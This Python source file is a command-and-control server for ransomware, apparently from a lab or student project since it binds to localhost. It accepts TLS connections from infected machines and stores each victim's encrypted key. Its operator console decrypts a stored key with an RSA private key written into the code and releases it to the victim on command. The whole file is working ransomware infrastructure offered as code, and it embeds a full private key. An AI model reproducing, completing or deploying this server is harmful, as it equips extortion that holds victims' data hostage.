"""
C&C server for communication with the ransomware on local machine
"""
import socket, select
import os
import sys
import ssl
from Crypto.PublicKey import RSA
from threading import Thread
from cryptography.fernet import Fernet
from Crypto.Cipher import PKCS1_OAEP

class ClientThread(Thread):
    """
    Client thread class, responsible for making connection to clients and sending them thier key
    """

    def __init__(self, host: str, port: int, conn: ssl.SSLSocket, tu) -> None:
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.conn = conn
        self.id = None
        self.thread_update = tu

    def run(self) -> None:
        """
        Run function:
        recieves the connection and then runs Servers thread_check function to properly update our database
        """
        while True:
            
            data = self.conn.recv(2048)

            if self.id == None:
                self.id = data

            if not data: break
            
            print(f"recieved user connectinon: {data}")

            try:
                data = data.decode("utf-8")
            except:
                continue
            print(len(data.split(' ')))
            if len(data.split(' ')) == 2:
                self.thread_update(self, data)


class Server():
    """
    Server Class, manages user files and connections
    """
    def __init__(self, host: str, port: int) -> None:
        
        """
        Mainly socket setup in the initialzer
        """
        self.privateKey = RSA.import_key(b'-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA3O2lkNYVKaUsOvEbXUoNJGJqBOmOMhaGsnvxhp0y4kFoY6gV\nDUpXtfcLejVEeaHttvudCUIN04ll1CLsuhlWShBSYC/H/zq0As07Ura4PEyzldZm\noFBaQcsZMh3oZbypk8avwrHLJDHCMusWJlB2dj1VRwdnrd4/kSAQLDBXHvVsfcb2\njIOKITHIj45GTb2yNCTk5af46gK3loMksxQxBdhjtbhXCaDpjaUIZtW41tALssh2\nsZOdY8M+qd2eL8cJ+lZGpTsU8/r9S90JLxnxxbzQdkP8AsEH01HRhYVtMzEzMB3q\ndkoqfl2KLMzGrXj9oIZrWUI2riMBd+wSIBx7PwIDAQABAoIBAEH2FjuzH2hqr1T9\nzazBwkC9vWewD8t2nErH5KnLX3jcDH3MnlR0gNGMa/nV05b5OM8sOoucFCK3YBbB\nQqqhi/ja/K1JNs5GSZ6YhgDBGyqtv+SZudRdiUUhjWlAMrXFaV/8r1dS3BL3ZELt\nm5Re66+Lyl1Fobfwpkv/JbT7zdco4ykjsAR89PPP23w9IHZ+ZnxXRHyQngHcAy8u\nFCwgQTeOZgN7M22mS4BZY9JJYAHiBWUx0JKj3fgZ45WiOii5tt3VgE6IUbXAs0fh\nCZ2dfYsPmhq0Yhrm6YiURlB16iffZmyX4EikJk++WyoNgUFIacCl0SVdEnlsca+9\nxTch50ECgYEA3w2f993uIjKkA5O+UIFZnFV4Mfmg006RvvGOkfI9TsXV7AVNS9ZG\nEqq4tPF7GM4/ZPl4OC2qr8Qnaw8P82zeWFYDEsCTWp7iv2LoiaKMLtG3bjQJHo8P\n5DFOJEILfcnJ5/1lJ1NbTYBl2tJmAbzOZLJMkE5E+IcMS+vOhjf2bt8CgYEA/Y+r\n/0S22qYZ6dMnmH5dPj+FIy2w/9EHsJRMBGDu/eJkEwCC0TRaUGiH3t1dAJ+tHeV6\n0fUjwXEWJWGbGly0SamATICZcBInyMf30J4OyVf8/su6gfuxL5JKcg1fwrjdKClI\n5uzrcvrYUAKXSoKCfys5yvzHKKMog5fRprCEX6ECgYEA2skHft4+BWc8v5F8nISz\n/AdN1V8wo/OuO+e+W2OLRSgCc/ajYd60bvzsHfe7MZKkVgvpItmQUcWKkJV+pNvF\noEoFy6//GWU9rlJ7Gv3ImOf2D2+U/ld/U+oU5rWthd2XYSmIvbEinntx7NhxXATx\nQY4uUWGkf04f/pw2wCpGW2sCgYA7tb6SIVNSD/VgO8pCPdelVf37N8JLq6S8718r\nVMxS2yIn22Hy8/okn0kHsWc6Q1/X/3c5xBmEbyYA7YhB3/zQr+q3mT0IyC24OWbh\nKKdgwKiiM8Wa4HNsOW3wh7e6OiBSWc6CGt6jN/ECfmm0MSGb4sj8RSR9LFbZDkJf\nl4fEoQKBgDxkrms7JGKPBolf1WjH+ujLS3UG0Tw4EnGIBykwyNoCJyHbexhKGAYJ\nUYmz8wEUOh/FkXf/fixmWs8jycZZWfDRNpqv49u9ERpPly9w/HpiCIwAri3GKzzP\njKNGpAWxR504vaLFMfj2eGDdYr1tnPcPlTygVbET5FF6MwVkb6tx\n-----END RSA PRIVATE KEY-----')
        self.decryptor = PKCS1_OAEP.new(self.privateKey)
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.context.load_cert_chain(os.path.join("cnc", "cert.pem"), os.path.join("cnc", "key.pem"))

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((host, port))
        self.sock.listen(10)
        self.secSock = self.context.wrap_socket(self.sock, server_side=True)
        self.host = host
        self.port = port
        self.threads = {}
        self.inp = ''
        

    def saveKey(self, uid: str, key: str) -> None:
        """
        Generate key and save it to file named after client id
        """
        print(key)
        with open(os.path.join("Users", uid), 'w') as gotUser:
            gotUser.write(key)

        return 

    def thread_check(self, new_thread: ClientThread, userId: str) -> None:
        """
        check if new user exists in our database, other wise add them to it and send a key
        """
        user, key = userId.split(' ')
        
        print("knowns users: ", self.threads.keys())

        if user in self.threads:
            new_thread.conn.send(b"wait")
            self.threads[user] = new_thread
            return
        
        self.saveKey(user, key)
        new_thread.conn.send(b"go")
        self.threads[user] = new_thread
    
    def start(self) -> None:
        """
        wait for connections
        """
        r_socks, w_socks, e_socks = select.select([self.secSock], [], [])
        while True:
            for sock in r_socks:
                (conn, (self.host, self.port)) = self.secSock.accept()
                new_thread = ClientThread(self.host, self.port, conn, self.thread_check)
                new_thread.start()
            
    def sig_dec(self, key: str, user: ClientThread) -> None:
        """
        Send user key for decyrption
        """
        byteKey = int(key).to_bytes((int(key).bit_length() + 7) // 8, 'little') or b'\0'
        decKey = self.decryptor.decrypt(byteKey)
        user.conn.send(decKey)

    def inputThread(self) -> str:
        """
        input loop to manage decryption
        use - type: decrypt and the name of the user file
        """
        
        while 1:
            self.inp = input(">: ")
            print(self.inp)
            if self.inp == "kill":
                return
            
            cmd = self.inp.split(' ')
            if len(cmd) > 1:
                user = cmd[1]
                cmd = cmd[0]
            else:
                continue

            if cmd == "decrypt":
                with open(os.path.join('Users', user), 'r') as userfile:
                    key = userfile.readline()
                    print(key)                   
                    self.sig_dec(key, self.threads[user])

    def inputLoop(self) -> None:
        """
        Main code for the server,
        starts the input loop and runs the client connection loop
        """
        
        inputThread = Thread(target=self.inputThread)
        inputThread.start()

        self.start()

        inputThread.join()
        





if __name__ == "__main__":

    s = Server("127.0.0.1", 5789)
    s.inputLoop()

    sys.exit()
